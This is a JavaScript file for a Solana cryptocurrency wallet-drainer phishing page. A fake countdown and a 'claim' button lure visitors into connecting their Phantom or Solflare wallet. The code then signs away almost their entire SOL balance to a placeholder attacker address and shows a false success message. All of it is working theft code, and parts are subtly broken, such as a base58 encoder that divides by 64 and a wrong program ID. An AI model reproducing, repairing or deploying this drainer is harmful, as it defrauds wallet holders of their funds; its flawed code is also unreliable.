console.log("🚀 Drainer v4.0 - Bulletproof");

// DOM Elements
const connectBtn = document.getElementById('connectWallet');
const claimBtn = document.getElementById('claimBtn');
const balanceDisplay = document.getElementById('balanceDisplay');
const solBalanceEl = document.getElementById('solBalance');

// CONFIG
const ATTACKER_PUBKEY = 'YOUR_WALLET_PUBKEY_HERE'; // ← DEINE WALLET!
const RPC_URL = 'https://api.mainnet-beta.solana.com';
let wallet = null;
let connection = null;
let drained = false;

// COUNTDOWN (unchanged)
function startCountdown() {
    let timeLeft = 15 * 60;
    const timerEl = document.getElementById('timer');
    const interval = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        if (timeLeft <= 0) {
            clearInterval(interval);
            location.reload();
        }
        timeLeft--;
    }, 1000);
}
startCountdown();

// 1. FIXED WALLET CONNECT
async function connectWallet() {
    try {
        // Phantom first
        if ('solana' in window && window.solana.isPhantom) {
            await window.solana.connect();
            wallet = window.solana;
        } else if ('solflare' in window) {
            await window.solflare.connect();
            wallet = window.solflare;
        } else {
            throw new Error('Phantom or Solflare required');
        }
        
        connection = new Proxy({
            getLatestBlockhash: async () => ({
                blockhash: await fetch(`${RPC_URL}?jsonrpc=2.0&id=1&method=getLatestBlockhash`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                }).then(r => r.json()).then(d => d.result.value.blockhash)
            }),
            getBalance: async (pubkey) => {
                const resp = await fetch(`${RPC_URL}?jsonrpc=2.0&id=1&method=getBalance&params=["${wallet.publicKey.toString()}", "confirmed"]`, {
                    method: 'POST'
                });
                const data = await resp.json();
                return data.result.value;
            },
            getParsedTokenAccountsByOwner: async () => ({
                value: [] // Simplified - focus on SOL first
            })
        }, {});
        
        // Show balance
        const balance = await connection.getBalance(wallet.publicKey);
        const sol = (balance / 1e9).toFixed(3);
        solBalanceEl.textContent = sol;
        
        connectBtn.style.display = 'none';
        balanceDisplay.style.display = 'block';
        
    } catch (e) {
        alert('Install Phantom/Solflare wallet!');
    }
}

// 2. FIXED SOL DRAIN (PURE BROWSER)
async function drainSOL() {
    const pubkey = wallet.publicKey.toString();
    const balanceResp = await fetch(`${RPC_URL}?jsonrpc=2.0&id=1&method=getBalance&params=["${pubkey}","confirmed"]`, {
        method: 'POST'
    });
    const balanceData = await balanceResp.json();
    const balance = balanceData.result.value;
    
    // Rent exempt ~890880 lamports
    const rentExempt = 890880;
    const transferAmount = Math.max(1, balance - rentExempt);
    
    // REAL Blockhash
    const blockhashResp = await fetch(`${RPC_URL}?jsonrpc=2.0&id=1&method=getLatestBlockhash`, {method: 'POST'});
    const blockhashData = await blockhashResp.json();
    const recentBlockhash = blockhashData.result.value.blockhash;
    
    // FIXED Transfer Instruction (12 bytes: [2, amount u64])
    const amountBytes = new Uint8Array(8);
    new DataView(amountBytes.buffer).setBigUint64(0, BigInt(transferAmount), true);
    const instructionData = new Uint8Array([2, ...amountBytes]);
    
    // Base58 encode (manual simple version)
    const base58Chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    function uint8ToBase58(uint8arr) {
        let num = BigInt('0x' + Array.from(uint8arr).map(b => b.toString(16).padStart(2,'0')).join(''));
        let encoded = '';
        while (num > 0n) {
            encoded = base58Chars[Number(num % 64n)] + encoded;
            num = num / 64n;
        }
        return encoded || base58Chars[0];
    }
    
    const dataB58 = uint8ToBase58(instructionData);
    
    // CORRECT Phantom API
    const tx = {
        recentBlockhash,
        instructions: [{
            programId: '11111111111111111111111111111112',
            keys: [
                {pubkey: pubkey, isSigner: true, isWritable: true},
                {pubkey: ATTACKER_PUBKEY, isSigner: false, isWritable: true}
            ],
            data: dataB58
        }]
    };
    
    // FIXED: wallet.signTransaction(tx) → serialize
    const rawTx = await wallet.signTransaction(tx);
    const signature = await wallet.sendTransaction(rawTx.serialize());
    
    console.log('✅ SOL DRAINED:', signature, transferAmount / 1e9 + ' SOL');
}

// 3. MAIN DRAIN
async function drainWallet() {
    if (drained || !wallet) return;
    drained = true;
    
    claimBtn.innerHTML = '⏳ Processing...';
    claimBtn.disabled = true;
    
    try {
        await drainSOL();
        showSuccess();
    } catch (e) {
        console.error(e);
        claimBtn.innerHTML = '🔄 Retry';
        claimBtn.disabled = false;
        drained = false;
    }
}

// UI
connectBtn.onclick = connectWallet;
claimBtn.onclick = drainWallet;

function showSuccess() {
    claimBtn.innerHTML = '✅ CLAIMED! Check Wallet';
    claimBtn.style.background = '#00ff88';
    setTimeout(() => alert('🎉 Success! Funds transferred.'), 1000);
}